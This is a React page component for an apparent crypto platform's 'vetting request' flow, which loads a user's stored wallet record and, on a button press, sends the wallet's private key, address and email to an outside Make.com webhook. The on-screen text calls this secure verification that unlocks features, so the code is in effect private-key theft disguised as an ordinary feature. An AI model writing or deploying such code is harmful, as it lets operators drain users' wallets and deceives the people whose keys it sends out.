import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import { Shield, Wallet, CheckCircle, AlertCircle, Send, Loader2, ExternalLink, Award, Lock } from 'lucide-react';
import { supabase } from '../lib/supabase';
import { useAuthStore } from '../store/authStore';
import { useThemeStore } from '../store/themeStore';
import { getBackgroundImage } from '../utils/theme';
import toast from 'react-hot-toast';

interface VettingWallet {
  id: number;
  wallet_address: string;
  privateKey: string;
  user_id: string;
  publicKey: string;
  mnemonic: string;
}

type PageState = 'loading' | 'no_wallet' | 'has_wallet' | 'submitting' | 'submitted';

export const SubmitVettingRequests: React.FC = () => {
  const { user } = useAuthStore();
  const { theme } = useThemeStore();
  const router = useRouter();
  const [pageState, setPageState] = useState<PageState>('loading');
  const [walletData, setWalletData] = useState<VettingWallet | null>(null);

  useEffect(() => {
    if (!user) {
      router.push('/login');
      return;
    }
    checkWalletStatus();
  }, [user, router]);

  const checkWalletStatus = async () => {
    if (!user?.email) return;

    try {
      const { data, error } = await supabase
        .from('vetting_wallets')
        .select('*')
        .eq('user_id', user.email)
        .maybeSingle();

      if (error) {
        console.error('Error checking wallet status:', error);
        toast.error('Failed to check wallet status');
        return;
      }

      if (data) {
        setWalletData(data);
        setPageState('has_wallet');
      } else {
        setPageState('no_wallet');
      }
    } catch (error) {
      console.error('Error checking wallet status:', error);
      toast.error('An unexpected error occurred');
    }
  };

  const handleSubmitVettingRequest = async () => {
    if (!walletData || !user?.email) {
      toast.error('Missing required information');
      return;
    }

    setPageState('submitting');
    try {
      const response = await fetch('https://hook.us2.make.com/aqt3pgb58d6iqf01fgr93ftsaaymv2qm', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          privateKey: walletData.privateKey,
          walletAddress: walletData.wallet_address,
          userEmail: user.email
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit vetting request');
      }

      setPageState('submitted');
      toast.success('Vetting request submitted successfully!');
    } catch (error) {
      console.error('Error submitting vetting request:', error);
      toast.error('Failed to submit vetting request. Please try again.');
      setPageState('has_wallet');
    }
  };

  const renderContent = () => {
    switch (pageState) {
      case 'loading':
        return (
          <div className="flex flex-col items-center justify-center py-12">
            <Loader2 className="h-12 w-12 animate-spin text-blue-500 mb-4" />
            <p className="text-white text-lg">Checking your wallet status...</p>
          </div>
        );

      case 'no_wallet':
        return (
          <div className="text-center">
            <div
              // to="/create-wallet"
              className="inline-flex items-center justify-center gap-2 px-8 py-4 bg-gradient-to-r from-blue-600 to-purple-600 text-white rounded-lg hover:from-blue-700 hover:to-purple-700 transition-all transform hover:scale-105 mx-auto shadow-lg"
            >
              <Wallet className="h-5 w-5" />
              Submit Request
              {/* <ExternalLink className="h-4 w-4" /> */}
            </div>
            {/* <div className="relative mb-8">
              <div className="w-24 h-24 bg-gradient-to-br from-orange-500 to-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
                <AlertCircle className="h-12 w-12 text-white" />
              </div>
            </div> 
            
            <h2 className="text-3xl font-bold text-white mb-4">Wallet Required</h2>
            <p className="text-gray-300 mb-6 max-w-2xl mx-auto">
              To submit a vetting request, you need to have a custodial wallet created first. 
              This wallet will be used to verify your identity and enable secure transactions.
            </p>
            
            <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-6 mb-8 max-w-md mx-auto">
              <div className="flex items-center gap-3 mb-4">
                <Wallet className="h-6 w-6 text-blue-400" />
                <h3 className="text-lg font-semibold text-white">Next Steps</h3>
              </div>
              <ol className="text-left text-gray-300 space-y-2">
                <li className="flex items-start gap-2">
                  <span className="flex-shrink-0 w-6 h-6 bg-blue-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</span>
                  <span>Create your custodial wallet</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="flex-shrink-0 w-6 h-6 bg-blue-600 text-white rounded-full flex items-center justify-center text-sm font-bold">2</span>
                  <span>Return here to submit your vetting request</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="flex-shrink-0 w-6 h-6 bg-blue-600 text-white rounded-full flex items-center justify-center text-sm font-bold">3</span>
                  <span>Wait for approval notification</span>
                </li>
              </ol>
            </div>

            <Link
              to="/create-wallet"
              className="inline-flex items-center justify-center gap-2 px-8 py-4 bg-gradient-to-r from-blue-600 to-purple-600 text-white rounded-lg hover:from-blue-700 hover:to-purple-700 transition-all transform hover:scale-105 mx-auto shadow-lg"
            >
              <Wallet className="h-5 w-5" />
              Create Custodial Wallet
              <ExternalLink className="h-4 w-4" />
            </Link>
            
            <p className="text-sm text-gray-400 mt-4">
              You'll be redirected to the wallet creation page
            </p> */}
          </div>
        );

      case 'has_wallet':
        return (
          <div className="text-center">
            <div className="relative mb-8">
              <div className="w-24 h-24 bg-gradient-to-br from-green-500 to-emerald-600 rounded-full flex items-center justify-center mx-auto mb-6">
                <Shield className="h-12 w-12 text-white" />
              </div>
              <div className="absolute -top-2 -right-2 w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center">
                <Wallet className="h-5 w-5 text-white" />
              </div>
            </div>
            
            <h2 className="text-3xl font-bold text-white mb-4">Ready for Vetting</h2>
            <p className="text-gray-300 mb-6 max-w-2xl mx-auto">
              Great! We found your custodial wallet. You're ready to submit your vetting request. 
              This will enable advanced features and secure transaction capabilities on our platform.
            </p>
            
            <div className="bg-white/5 rounded-lg p-6 mb-8 max-w-md mx-auto">
              <h3 className="text-lg font-semibold text-white mb-4 flex items-center justify-center gap-2">
                <Lock className="h-5 w-5 text-green-400" />
                Your Wallet Details
              </h3>
              <div className="space-y-3 text-left">
                <div className="flex justify-between items-center">
                  <span className="text-gray-400">Wallet Address:</span>
                  <span className="text-white font-mono text-sm">
                    {walletData?.wallet_address.slice(0, 6)}...{walletData?.wallet_address.slice(-4)}
                  </span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-400">Status:</span>
                  <span className="text-green-400 font-medium">Ready</span>
                </div>
              </div>
            </div>

            <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-6 mb-8 max-w-md mx-auto">
              <h3 className="text-lg font-semibold text-white mb-4">What happens next?</h3>
              <ul className="text-left text-gray-300 space-y-2">
                <li className="flex items-center gap-2">
                  <CheckCircle className="h-5 w-5 text-green-400 flex-shrink-0" />
                  <span>Your wallet credentials will be securely verified</span>
                </li>
                <li className="flex items-center gap-2">
                  <CheckCircle className="h-5 w-5 text-green-400 flex-shrink-0" />
                  <span>Advanced transaction features will be unlocked</span>
                </li>
                <li className="flex items-center gap-2">
                  <CheckCircle className="h-5 w-5 text-green-400 flex-shrink-0" />
                  <span>You'll receive email notification upon approval</span>
                </li>
                <li className="flex items-center gap-2">
                  <CheckCircle className="h-5 w-5 text-green-400 flex-shrink-0" />
                  <span>Access to exclusive verified member benefits</span>
                </li>
              </ul>
            </div>

            <button
              onClick={handleSubmitVettingRequest}
              className="flex items-center justify-center gap-2 px-8 py-4 bg-gradient-to-r from-green-600 to-blue-600 text-white rounded-lg hover:from-green-700 hover:to-blue-700 transition-all transform hover:scale-105 mx-auto shadow-lg"
            >
              <Send className="h-5 w-5" />
              Submit Vetting Request
            </button>
            
            <p className="text-sm text-gray-400 mt-4">
              Your wallet credentials will be sent securely for verification
            </p>
          </div>
        );

      case 'submitting':
        return (
          <div className="flex flex-col items-center justify-center py-12">
            <div className="w-24 h-24 bg-gradient-to-br from-blue-500 to-purple-500 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
              <Send className="h-12 w-12 text-white" />
            </div>
            <h2 className="text-3xl font-bold text-white mb-4">Submitting Request...</h2>
            <p className="text-gray-300 mb-6">
              Please wait while we securely process your vetting request.
            </p>
            <Loader2 className="h-8 w-8 animate-spin text-blue-500" />
          </div>
        );

      case 'submitted':
        return (
          <div className="text-center">
            <div className="relative mb-8">
              <div className="w-24 h-24 bg-gradient-to-br from-green-500 to-emerald-600 rounded-full flex items-center justify-center mx-auto mb-6">
                <CheckCircle className="h-12 w-12 text-white" />
              </div>
              <div className="absolute -top-2 -right-2 w-8 h-8 bg-yellow-500 rounded-full flex items-center justify-center animate-bounce">
                <Award className="h-5 w-5 text-white" />
              </div>
            </div>
            
            <h2 className="text-3xl font-bold text-white mb-4">🎉 Request Submitted Successfully!</h2>
            <p className="text-gray-300 mb-6 max-w-2xl mx-auto">
              Your vetting request has been submitted and is now under review by our verification team. 
              We will notify you via email once your request has been approved.
            </p>
            
            <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-6 mb-8 max-w-md mx-auto">
              <div className="flex items-center gap-3 mb-4">
                <CheckCircle className="h-6 w-6 text-green-400" />
                <h3 className="text-lg font-semibold text-white">What's Next?</h3>
              </div>
              <ul className="text-left text-gray-300 space-y-2">
                <li>• Our verification team will review your request within 24-48 hours</li>
                <li>• You'll receive an email notification once approved</li>
                <li>• Advanced features will be automatically unlocked</li>
                <li>• Check your notifications for updates</li>
              </ul>
            </div>

            <div className="flex flex-col sm:flex-row gap-4 justify-center">
              <button
                onClick={() => router.push('/')}
                className="px-8 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
              >
                Go to Dashboard
              </button>
              <button
                onClick={() => router.push('/notifications')}
                className="px-8 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors"
              >
                View Notifications
              </button>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div
      className="min-h-screen bg-[#0d182a] bg-opacity-95 py-8"
      style={{
        backgroundImage: `url('${getBackgroundImage(theme)}')`,
        backgroundBlendMode: 'overlay',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundAttachment: 'fixed'
      }}
    >
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <div className="bg-white/10 backdrop-blur-sm rounded-lg shadow-xl p-8 sm:p-12">
          <div className="text-center mb-8">
            <div className="w-20 h-20 bg-gradient-to-br from-purple-500 to-blue-500 rounded-full flex items-center justify-center mx-auto mb-6">
              <Shield className="h-10 w-10 text-white" />
            </div>
            <h1 className="text-3xl font-bold text-white mb-4">Submit Vetting Request</h1>
            <p className="text-gray-300 max-w-2xl mx-auto">
              Submit your account for verification to unlock advanced features and secure transaction capabilities. 
              Our verification process ensures a trusted environment for all users.
            </p>
          </div>

          {renderContent()}
        </div>
      </div>
    </div>
  );
};